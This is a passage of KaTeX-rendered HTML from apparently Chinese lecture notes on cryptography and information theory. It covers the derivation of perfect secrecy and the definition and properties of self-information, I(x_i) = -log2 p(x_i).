xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msup><mi>x</mi><mo>∗</mo></msup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[x^*]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>已知，设为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi></mrow><annotation encoding="application/x-tex">P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>，那么<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msup><mi>x</mi><mo>∗</mo></msup><mi mathvariant="normal">∣</mi><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><mfrac><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msup><mi>x</mi><mo>∗</mo></msup><mi>y</mi><mo stretchy="false">]</mo></mrow><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo></mrow></mfrac><mo>=</mo><mfrac><mrow><mo>∑</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>k</mi><mo>:</mo><msup><mi>x</mi><mo>∗</mo></msup><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msup><mi>x</mi><mo>∗</mo></msup><mo stretchy="false">]</mo></mrow><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo></mrow></mfrac><mo>=</mo><mi>P</mi></mrow><annotation encoding="application/x-tex">Pr[x^*|y]=\frac{Pr[x^*y]}{Pr[y]}=\frac{\sum Pr[k:x^*=d_k(y)]Pr[x^*]}{Pr[y]}=P</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.53934em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01934em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">]</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">[</span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7633428571428571em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.539347em;vertical-align:-0.52em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.019347em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">]</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.485007em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace mtight" style="margin-right:0.19516666666666668em;"></span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">[</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">:</span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7633428571428571em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mrel mtight">=</span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3487714285714287em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15122857142857138em;"><span></span></span></span></span></span></span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mclose mtight">)</span><span class="mclose mtight">]</span><span class="mord mathnormal mtight" style="margin-right:0.13889em;">P</span><span class="mord mathnormal mtight" style="margin-right:0.02778em;">r</span><span class="mopen mtight">[</span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7633428571428571em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose mtight">]</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.52em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span></span></span></span>。要使得<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msup><mi>x</mi><mo>∗</mo></msup><mi mathvariant="normal">∣</mi><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><msup><mi>x</mi><mo>∗</mo></msup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[x^*|y]=Pr[x^*]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span>，则有<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo stretchy="false">]</mo><mo>=</mo><mo>∑</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>k</mi><mo>:</mo><msup><mi>x</mi><mo>∗</mo></msup><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">Pr[y]=\sum Pr[k:x^*=d_k(y)]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.00001em;vertical-align:-0.25001em;"></span><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose">]</span></span></span></span>，即对于任意密文字符<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，其出现的概率均等于能够将<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>y</mi></mrow><annotation encoding="application/x-tex">y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>解密为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>x</mi><mo>∗</mo></msup></mrow><annotation encoding="application/x-tex">x^*</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.688696em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.688696em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mbin mtight">∗</span></span></span></span></span></span></span></span></span></span></span>的全部密钥的出现概率。</font></p><h2 id="六-自信息量"><a class="markdownIt-Anchor" href="#六-自信息量"></a> 六、 自信息量</h2><ul><li>信息量<ul><li>对信息的直观认识<ul><li>信道上传送随机变化的值</li><li>时间发生概率与信息量的关系</li><li>消息间的依赖关系与相互之间的信息量</li><li>信息消除不确定性</li><li>信息可加</li></ul></li></ul></li></ul><ul><li>自信息量<br />单符号离散信源的数学模型可用一位随机变量<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>的概率空间描述，即每个<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow><annotation encoding="application/x-tex">x\in X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span>均对应一个概率<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(x_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，如果信源发出消息<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">x_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的概率为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p(x_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>，则其能提供的自信息量（自信息）为：（式中的底数可以换，这里由于使用比特作为信息媒介，因此使用2作为底数。如果使用10进制数字，则就应使用10作为底数，即底数由媒介的可能取值数决定）</li></ul><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><mrow><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow></mfrac><mo>=</mo><mo>−</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>p</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(x_i)=\log_2\frac{1}{p(x_i)}=-\log_2p(x_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.25744em;vertical-align:-0.936em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">−</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>理解：信源发出信号前信宿对消息的不确定，信源发出信息后提供给信宿的信息量，即消除不确定性所需要的信息量。如可能的情况一共8种，那么自然需要3个比特才能表示所有状态，能够确定这个信息属于什么状态。</p><ul><li><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(x_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>的性质：</p><ul><li>非负</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">P(x_i)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>时<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">I(x_i)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span></li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>P</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">P(x_i)=0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span></span></span></span>时<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mo>+</mo><mi mathvariant="normal">∞</mi></mrow><annotation encoding="application/x-tex">I(x_i)=+\infty</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" 